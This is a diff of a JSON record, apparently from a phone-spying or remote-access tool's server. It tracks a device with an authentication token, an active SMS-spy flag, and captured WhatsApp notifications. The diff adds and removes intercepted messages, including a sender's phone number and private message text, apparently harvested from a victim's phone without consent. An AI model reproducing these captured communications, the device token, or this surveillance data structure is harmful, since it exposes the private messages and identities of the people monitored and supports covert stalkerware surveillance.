@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776858407526,
+    "lastSeen": 1776858410538,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎60 pesan dari 37 chat",
+        "time": "22/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776858413178
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "22/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776858412846
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 38 chat",
+        "time": "22/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776858409671
+      },
       {
         "appName": "WhatsApp",
         "sender": "Maya",
@@ -3995,30 +4019,6 @@
         "time": "22/04 15:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1776841928948
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "7Sex Message",
-        "content": "‎36 pesan baru",
-        "time": "22/04 15:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841922457
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (36 pesan): ~ ᥬ--𝗛𝗔𝗠𝗭 || 𝗖𝘆𝗯𝗲𝗿​​᭄ツ",
-        "content": "Sukses Berubah Menjadi Pemakaian Sendiri",
-        "time": "22/04 15:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841922253
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (35 pesan): ~ Amsal",
-        "content": "ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ꜰᴏʀ ᴏᴡɴᴇʀ.",
-        "time": "22/04 15:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841916897
       }
     ],
     "galleryPhotos": [],
